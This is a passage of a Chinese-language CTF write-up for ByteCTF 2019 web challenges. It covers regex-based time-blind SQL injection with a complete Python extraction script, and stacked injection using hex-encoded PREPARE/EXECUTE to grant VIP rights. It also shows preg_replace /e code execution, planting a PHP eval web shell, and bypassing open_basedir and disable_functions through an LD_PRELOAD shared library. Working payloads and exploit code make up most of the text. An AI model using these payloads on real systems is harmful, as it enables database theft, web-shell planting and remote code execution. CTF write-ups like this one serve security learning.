&quot;benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&apos;\&quot;\\d]+?=[\\(\\)&apos;\&quot;\\d]+?|[\\(\\)&apos;\&quot;a-zA-Z]+?=[\\(\\)&apos;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&apos;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&apos;%0B&apos;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span><br><span class="line">			if(preg_match(&apos;/&apos; . $filter . &apos;/is&apos;, $value))&#123;</span><br><span class="line">				exit(&quot;&lt;script&gt;alert(&apos;Failure!Do not use sensitive words.&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			SafeFilter($arr[$key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST &amp;&amp; SafeFilter($_POST);</span><br></pre></td></tr></table></figure>
+<p>可以看到过滤了一大堆字符</p>
+<p>看源码可以知道回显和报错是不可能了，于是考虑一下时间盲注。但是sleep和benchmark都被过滤了，不过查一下可以查到一些神奇的时间盲注方式<br><a href="https://www.cdxy.me/?p=789" target="_blank" rel="noopener">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a><br>这里直接用了里面的rlike注入，这个是依靠大量字符的正则匹配，让数据库无法立即响应导致延时，但我本地怎么测试都是一瞬间就完成的，不过拿到这题上却可以Orz<br>然后测试了一下<code>select a from b</code>是不行的，但<code>select(a) from b</code>可以，于是payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; || if((select(length(concat_ws(&apos;,&apos;,username,password,isvip))) from users limit 1)=38,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0</span><br><span class="line">1&apos; || if(ascii(substr((select(concat_ws(&apos;,&apos;,username,password,isvip)) from users limit 1),1,1))=63,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0</span><br></pre></td></tr></table></figure>
+<p>盲注脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">w_url = r&apos;http://aba94093-f182-4f37-9cae-548220b330fb.node3.buuoj.cn/writing.php&apos;</span><br><span class="line">e_url = r&apos;http://aba94093-f182-4f37-9cae-548220b330fb.node3.buuoj.cn/edit.php&apos;</span><br><span class="line">cookie = &#123;&apos;PHPSESSID&apos;:&apos;f27ec7d983efa78414a65ba23094d94a&apos;&#125;</span><br><span class="line"></span><br><span class="line">l1 = 0</span><br><span class="line">r1 = 100</span><br><span class="line"></span><br><span class="line">p = 2</span><br><span class="line"></span><br><span class="line">while(l1&lt;=r1):</span><br><span class="line">	mid1 = (l1 + r1)/2	</span><br><span class="line">	payload = &quot;1&apos; || if((select(length(concat_ws(&apos;,&apos;,username,password,isvip))) from users limit 1)=&quot;+str(mid1)+&quot;,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0&quot;</span><br><span class="line">	print payload</span><br><span class="line">	data = &#123;</span><br><span class="line">		&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">		&apos;title&apos;:payload</span><br><span class="line">	&#125;</span><br><span class="line">	http = requests.post(w_url,data=data,cookies=cookie)</span><br><span class="line">	data = &#123;</span><br><span class="line">		&apos;id&apos;:p,</span><br><span class="line">		&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">		&apos;title&apos;:&apos;xxx&apos;</span><br><span class="line">	&#125;</span><br><span class="line">	p = p+1</span><br><span class="line">	try:</span><br><span class="line">		http = requests.post(e_url,data=data,cookies=cookie,timeout=3)</span><br><span class="line">	except requests.exceptions.Timeout:</span><br><span class="line">		break</span><br><span class="line">	time.sleep(1)</span><br><span class="line">	payload = &quot;1&apos; || if((select(length(concat_ws(&apos;,&apos;,username,password,isvip))) from users limit 1)&gt;&quot;+str(mid1)+&quot;,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0&quot;</span><br><span class="line">	print payload</span><br><span class="line">	data = &#123;</span><br><span class="line">		&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">		&apos;title&apos;:payload</span><br><span class="line">	&#125;</span><br><span class="line">	http = requests.post(w_url,data=data,cookies=cookie)</span><br><span class="line">	data = &#123;</span><br><span class="line">		&apos;id&apos;:p,</span><br><span class="line">		&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">		&apos;title&apos;:&apos;xxx&apos;</span><br><span class="line">	&#125;</span><br><span class="line">	p = p+1</span><br><span class="line">	try:</span><br><span class="line">		http = requests.post(e_url,data=data,cookies=cookie,timeout=3)</span><br><span class="line">		r1 = mid1 - 1</span><br><span class="line">	except requests.exceptions.Timeout:</span><br><span class="line">		l1 = mid1 + 1</span><br><span class="line">	time.sleep(1)</span><br><span class="line"></span><br><span class="line">print </span><br><span class="line">print str(mid1)</span><br><span class="line"></span><br><span class="line">res = &apos;&apos;</span><br><span class="line">mid1 = 13</span><br><span class="line">for j in range(mid1):</span><br><span class="line">	l2 = 0</span><br><span class="line">	r2 = 127</span><br><span class="line">	while(l2&lt;=r2):</span><br><span class="line">		mid2 = (l2 + r2)/2	</span><br><span class="line">		payload =&quot;1&apos; || if(ascii(substr((select(concat_ws(&apos;,&apos;,username,password,isvip)) from users limit 1),&quot;+str(j+1)+&quot;,1))=&quot;+str(mid2)+&quot;,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0&quot;</span><br><span class="line">		print payload</span><br><span class="line">		data = &#123;</span><br><span class="line">			&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">			&apos;title&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line">		http = requests.post(w_url,data=data,cookies=cookie)</span><br><span class="line">		data = &#123;</span><br><span class="line">			&apos;id&apos;:p,</span><br><span class="line">			&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">			&apos;title&apos;:&apos;xxx&apos;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p+1</span><br><span class="line">		try:</span><br><span class="line">			http = requests.post(e_url,data=data,cookies=cookie,timeout=3)</span><br><span class="line">		except requests.exceptions.Timeout:</span><br><span class="line">			break</span><br><span class="line">		time.sleep(1)</span><br><span class="line">		payload =&quot;1&apos; || if(ascii(substr((select(concat_ws(&apos;,&apos;,username,password,isvip)) from users limit 1),&quot;+str(j+1)+&quot;,1))&gt;&quot;+str(mid2)+&quot;,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+b&apos;,1) || &apos;1&apos;=&apos;0&quot;</span><br><span class="line">		print payload</span><br><span class="line">		data = &#123;</span><br><span class="line">			&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">			&apos;title&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line">		http = requests.post(w_url,data=data,cookies=cookie)</span><br><span class="line">		data = &#123;</span><br><span class="line">			&apos;id&apos;:p,</span><br><span class="line">			&apos;content&apos;:&apos;aaa&apos;,</span><br><span class="line">			&apos;title&apos;:&apos;xxx&apos;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p+1</span><br><span class="line">		try:</span><br><span class="line">			http = requests.post(e_url,data=data,cookies=cookie,timeout=3)</span><br><span class="line">			r2 = mid2 - 1</span><br><span class="line">		except requests.exceptions.Timeout:</span><br><span class="line">			l2 = mid2 + 1</span><br><span class="line">		time.sleep(1)</span><br><span class="line">	res = res + chr(mid2)</span><br><span class="line">	print res</span><br></pre></td></tr></table></figure>
+<p>一开始还zz地去爆库表，后来突然想到源码里都给了表名了，白白浪费了一堆时间<br>不过跑出来的结果是只有我的账号？？？这要咋整？</p>
+<p>于是继续搜集信息，发现还有一个replace页面，仅允许vip访问，于是看看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	header(&quot;Location: login.php&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&apos;id&apos;] . &quot;;&quot;) as $v)&#123;</span><br><span class="line">	$row = $v;</span><br><span class="line">&#125;</span><br><span class="line">if($row[&apos;isvip&apos;] == 1)&#123;</span><br><span class="line">	if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">		foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_GET[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">			$row = $v;</span><br><span class="line">		&#125;</span><br><span class="line">		if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">			include(&quot;templates/replace.html&quot;);</span><br><span class="line">			exit();</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			exit(&quot;&lt;script&gt;alert(&apos;You do not have permission.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	if(isset($_POST[&apos;find&apos;]) &amp;&amp; isset($_POST[&apos;replace&apos;]) &amp;&amp; isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">		foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_POST[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">			$row = $v;</span><br><span class="line">		&#125;</span><br><span class="line">		if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">			if(isset($_POST[&apos;regex&apos;]) &amp;&amp; $_POST[&apos;regex&apos;] == &apos;1&apos;)&#123;</span><br><span class="line">				$content = addslashes(preg_replace(&quot;/&quot; . $_POST[&apos;find&apos;] . &quot;/&quot;, $_POST[&apos;replace&apos;], $row[&apos;content&apos;]));</span><br><span class="line">				$sql-&gt;query(&quot;update article set content=&apos;$content&apos; where id=&quot; . $row[&apos;id&apos;] . &quot;;&quot;);</span><br><span class="line">				exit(&quot;&lt;script&gt;alert(&apos;Replaced successfully.&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				$content = addslashes(str_replace($_POST[&apos;find&apos;], $_POST[&apos;replace&apos;], $row[&apos;content&apos;]));</span><br><span class="line">				$sql-&gt;query(&quot;update article set content=&apos;$content&apos; where id=&quot; . $row[&apos;id&apos;] . &quot;;&quot;);</span><br><span class="line">				exit(&quot;&lt;script&gt;alert(&apos;Replaced successfully.&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			exit(&quot;&lt;script&gt;alert(&apos;You do not have permission.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	exit(&quot;&lt;script&gt;alert(&apos;You are not VIP so you cannot use this function.&apos;);history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里判断数据库中存的vip是否为1，明显我的账号不是1。只能想办法整成1</p>
+<p>这里要用到之前没注意过的一个点，在<code>config.php</code>中可以看到使用了PDO连接数据库。PDO在php5.3后支持多语句查询，这是能够堆叠注入的基础。而看源码可以知道所有的sql查询都是直接拼接入sql语句中的，导致PDO的预编译没起效果，因此可以使用堆叠注入</p>
+<p>由于set前存在闭合的引号会被过滤，不能直接update，这里要用点小技巧。mysql支持预处理语句，预处理语句起着防止源码泄露后导致数据库结构的作用。预处理的主要用到三个语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>
+<p><code>PREPARE</code>用于设定好语句放入<code>stmt_name</code>，<code>EXCUTE</code>对应赋值并执行<code>stmt_name</code>，最后一个语句是用来解除掉预处理的，也就是如果解除掉<code>stmt_name</code>的预处理的话，用<code>EXCUTE</code>去执行就会报错</p>
+<p>要使用预处理，就要用<code>preparable_stmt</code>为<code>stmt_name</code>赋值，<code>preparable_stmt</code>可以直接是一个字符串，也可以是一个变量。而mysql中可以通过<code>set @</code>来设置一个临时变量，而mysql是在语句中可以解析16进制的，于是我们可以将语句转为16进制后赋给一个变量，然后放入预处理中执行<br>于是payload就是<br><code>&#39;;set @sql=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2761616161273b;prepare a from @sql;execute a;#</code></p>
+<p>获得vip权限后读<code>replace.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;find&apos;]) &amp;&amp; isset($_POST[&apos;replace&apos;]) &amp;&amp; isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">	foreach($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_POST[&apos;id&apos;]) . &quot;;&quot;) as $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_SESSION[&apos;id&apos;] == $row[&apos;userid&apos;])&#123;</span><br><span class="line">		if(isset($_POST[&apos;regex&apos;]) &amp;&amp; $_POST[&apos;regex&apos;] == &apos;1&apos;)&#123;</span><br><span class="line">			$content = addslashes(preg_replace(&quot;/&quot; . $_POST[&apos;find&apos;] . &quot;/&quot;, $_POST[&apos;replace&apos;], $row[&apos;content&apos;]));</span><br></pre></td></tr></table></figure>
+<p>可以看到里面使用了<code>preg_replace()</code>，这里直接拼接的参数都是可控的，那我们就可以控制为使得正则表达式为<code>//e</code>以达到命令执行（需要php版本&lt;5.6），这里还要用<code>%00</code>截断（需要php版本&lt;5.3.4）一下后面的<code>/</code><br>于是尝试去获得phpinfo</p>
+<p><code>id=2&amp;find=%2Fe%00&amp;replace=phpinfo();&amp;regex=1</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/a3c21724bff8c120644db4764adc733d.png" alt=""></p>
+<p>成功获得，于是直接扔一个shell上去<br><code>file_put_contents(&#39;/var/www/html/xxx.php&#39;,&#39;&lt;?php eval($_GET[\&#39;cmd\&#39;]);?&gt;&#39;);</code></p>
+<p>接着用<code>system()</code>去读一下根目录</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/728d786d4359da9c62320a187df67db4.png" alt=""></p>
+<p>被禁用，于是去查查看<code>phpinfo()</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/83cc4169b25ab086de2b2f2055c62b72.png" alt=""></p>
+<p>system等一系列系统函数都被禁用了，于是用<code>scandir()</code>扫</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/06d0360200ce033d21556aafea228a6e.png" alt=""></p>
+<p>在扫上级目录时返回了提示<code>open_basedir</code>，再去看<code>phpinfo()</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/446816224e70efd3e112c96c0c825ed5.png" alt=""></p>
+<p>设置了<code>open_basedir</code>，于是又要绕一波，不过由于<code>ini_set()</code>也被禁用了，要寻找其它绕过方式，这里整合了很多绕过的技巧</p>
+<p><a href="https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法" target="_blank" rel="noopener">浅谈几种Bypass open_basedir的方法 </a></p>
+<p>这里用<code>DirectoryIterator+glob://</code>的方法扫一下根目录<br><code>cmd=$c = $_GET[&#39;c&#39;];$a = new DirectoryIterator($c);foreach($a as $f){echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}&amp;c=glob:///*</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/1ce25df4c58739924649716b8e51de81.png" alt=""></p>
+<p>可以看到有readflag，但<code>DirectoryIterator+glob://</code>并不能执行命令，这里可以使用<code>LD_PRELOAD + error_log()</code>来绕（SUCTF说过的fpm好像也行，不过不知道题目环境有没有开就没弄了）</p>
+<p>具体原理看这<a href="https://www.guildhab.top/?p=1153" target="_blank" rel="noopener">Bypass Disable_function</a></p>
+<p>简单来说就是<code>LD_PRELOA</code>D可以设置预加载的共享库文件，当设置了后这个共享库文件的优先级甚至会大于<code>libc.so</code>，当共享库文件中有和<code>libc.so</code>一样的函数名的函数时，优先使用共享库文件中的函数<br>通过这种方式直接去修改底层的函数，控制某个php方法的执行，这样就可以不使用<code>system()</code>之类的方法也能达到命令执行。不过要预加载共享库文件，需要新开一个进程加载，这里原文的作者找到了<code>mail()</code>以及<code>error_log()</code>能够开启新进程</p>
+<p>这里用构造器来写就可以不用去改已有的内置函数防止出错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void flag()&#123;</span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">	system(&quot;/readflag &gt; /var/www/html/flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>gcc -shared flag.c -o flag.so</code><br>生成共享库文件后用菜刀上传</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/f0b193f8cf526fbe4093559008e2f7f0.png" alt=""></p>
+<p>最后执行一下<br><code>?cmd=putenv(&quot;LD_PRELOAD=/var/www/html/flag.so&quot;);error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</code></p>
+<p>然而buu上的readflag需要计算</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/cd055f3dd16af72b99bbb42b1708a92f.png" alt=""></p>
+<p>于是使用一些其它操作，先检查一下服务器上有没有perl<br><code>perl -v &gt; /var/www/html/i.txt</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/e6bc880bdbf6c588b1eb913dd40c0242.png" alt=""></p>
+<p>有安装perl，看这个readflag的输出感觉和*ctf有一题应该时一样的，于是拿当时的官方exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use IPC::Open3;</span><br><span class="line">my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, &apos;/readflag&apos; )</span><br><span class="line">  or die &quot;open3() failed $!&quot;;</span><br><span class="line">my $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line">print &quot;$r&quot;;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line">print &quot;$r&quot;;</span><br><span class="line">$r = eval &quot;$r&quot;;</span><br><span class="line">print &quot;$r\n&quot;;</span><br><span class="line">print CHLD_IN &quot;$r\n&quot;;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line">print &quot;$r&quot;;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line">print &quot;$r&quot;;</span><br></pre></td></tr></table></figure>
+<p>然后执行输出<br><code>perl /var/www/html/a.pl &gt; /var/www/html/b.html</code><br>再访问一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/753a0667c74005c21b7dfc3df7b72150.png" alt=""></p>
+<p>这里记得要用html或者其它能显示的，一开始用了txt什么都显示不出来，查了别人的wp后才发现txt要下载才能看到，之前的就已经打出来了，真的傻了</p>
+<p>还有那个盲注的部分，实际上还能用这个payload进行布尔盲注<br><code>1&#39; ^ (ascii(substr((select(group_concat(table_name)) from (information_schema.tables)where table_schema=database()),1,1))&gt;200) ^ &#39;1</code><br>这个payload正确的情况下是会所有文章都改成一样，可以通过这个逻辑去判断。实际上我的那个payload当错误时也会全改，不过判断时间简单点，虽然有点久</p>
+<h2 id="icloudmusic"><a href="#icloudmusic" class="headerlink" title="icloudmusic"></a>icloudmusic</h2><p>这题唯一解的W&amp;M战队的大佬说是漏洞危害不公开wp，也没有环境分析，就先放着吧（好像是SUCTF那道改的题）</p>
+<h2 id="DOT-server-prove"><a href="#DOT-server-prove" class="headerlink" title="DOT_server_prove"></a>DOT_server_prove</h2><p>这题也没有靶机，看<a href="https://xz.aliyun.com/t/6312" target="_blank" rel="noopener">wp</a>记录几点疑问以及自己的见解</p>
+<p>首先是parse文件，放入IDA分析后</p>
